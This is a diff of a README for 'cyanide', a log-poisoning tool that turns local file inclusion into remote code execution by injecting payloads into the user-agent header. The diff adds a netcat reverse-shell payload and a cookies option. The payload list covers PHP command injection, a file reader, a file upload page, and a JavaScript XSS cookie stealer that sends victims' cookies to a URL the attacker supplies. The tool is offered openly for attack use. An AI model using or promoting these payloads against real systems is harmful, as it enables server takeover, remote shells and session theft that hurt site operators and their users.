@@ -1,18 +1,18 @@
 # cyanide
 
-Cyanide is a tool to poison request logs by injecting a payload in the user-agent. It currently has 5 standalone payloads.
-
-This is a BadByte, my hacking team, Official Tool. You can join our hacking community [here](https://discord.gg/CDACNFg).
+Cyanide is a tool to poison request logs by injecting a payload in the user-agent. It currently has 6 standalone payloads.
 
 ## Installation
-For now, the only way of downloading this project is by cloning this repo. PyPi support will be added in the next update, hopefully!
+As of now, the only way of downloading this project is by cloning this repo.
 
 ## Usage
 
 ```
-usage: cyanide.py [-h] [-q] [-Pl] [-pl [PAYLOAD [PAYLOAD ...]]] [-m METHOD] [-P PARAMETER] [-e] [-E] [-p PREFIX] [-s SUFFIX] [-u URL]
+usage: cyanide.py [-h] [-q] [-Pl] [-pl [PAYLOAD ...]] [-m METHOD] [-P PARAMETER]
+                  [-C COOKIES] [-e] [-E] [-p PREFIX] [-s SUFFIX] [-u URL]
 
-Log poisoner. Turns a Local File Inclusion to a Remote Code Execution. Counts 5 different payloads for now.
+Log poisoner. Turns a Local File Inclusion to a Remote Code Execution. Counts 6
+different payloads for now.
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -20,12 +20,16 @@ optional arguments:
                         Quiet mode. No banner.
   -Pl, --payloads, --list
                         List all possible payloads.
-  -pl [PAYLOAD [DATA ...]], --payload [PAYLOAD [DATA ...]], --set-payload [PAYLOAD [DATA ...]]
-                        Set payload (by index or ID). Use -Pl to list available payloads.
+  -pl [PAYLOAD ...], --payload [PAYLOAD ...], --set-payload [PAYLOAD ...]
+                        Set payload (by index or ID). Use -Pl to list available
+                        payloads.
   -m METHOD, --method METHOD
                         HTTP request method. Ex.: POST
   -P PARAMETER, --par PARAMETER, --parameter PARAMETER
                         Query parameter name. Ex.: '-P view' => '?view='
+  -C COOKIES, --cookies COOKIES
+                        Set request cookies such as PHP session in JSON format (ex.:
+                        '{"key":"value", ...}').
   -e, --encode, --dds-encode
                         URL encode ../
   -E, --double-encode, --dds-double-encode
@@ -41,8 +45,8 @@ optional arguments:
 Payloads:
 ```
 [?] PHPCMD (min. 72 chars, necessitates 0 args) -> PHP Simple Command Injection: [PHP] Simple command injection with query variable 'c'. Usage: Ex.: ?c=ls
-[?] PHPB64CMD (min. 102 chars, necessitates 0 args) -> PHP Simple Base64 Command Injection: [PHP] Simple command injection with query variable 'b', but the command is base64 and URL encoded. 
-Usage: Ex.: ?b=bHM%3D
+[?] PHPB64CMD (min. 102 chars, necessitates 0 args) -> PHP Simple Base64 Command Injection: [PHP] Simple command injection with query variable 'b', but the command is base64 and URL encoded. Usage: Ex.: ?b=bHM%3D
+[?] PHPREVSHELL (min. 78 chars, necessitates 2 args) -> PHP Simple NETCAT Reverse Shell: [PHP] Simple Reverse Shell. Needs two arguments, the IP and port. WARNING: REQUIRES Netcat. Usage: Specify the arguments after choosing the payload. Ex.: -pl PHPREVSHELL 127.0.0.1 4444
 [?] PHPREADFILE (min. 130 chars, necessitates 0 args) -> PHP File Reader: [PHP] Read a file's contents. Using parameter 'f' to specificy a filename. Usage: Ex.: ?f=filename.ext
 [?] PHPUPLOAD (min. 328 chars, necessitates 0 args) -> PHP Simple File Upload: [PHP] Simple file upload page to pop in the logs. Usage: You should find a typical file upload section in the logs.
 [?] JSCOOKIEXSS (min. 104 chars, necessitates 1 args) -> JavaScript Simple XSS Cookie Stealer: [JS] Simple XSS Cookie Stealer. Needs one argument being the link to send a request with the cookies to. Usage: Specify the URL after choosing the payload. Ex.: -pl JSCOOKIEXSS http://myurl.com/
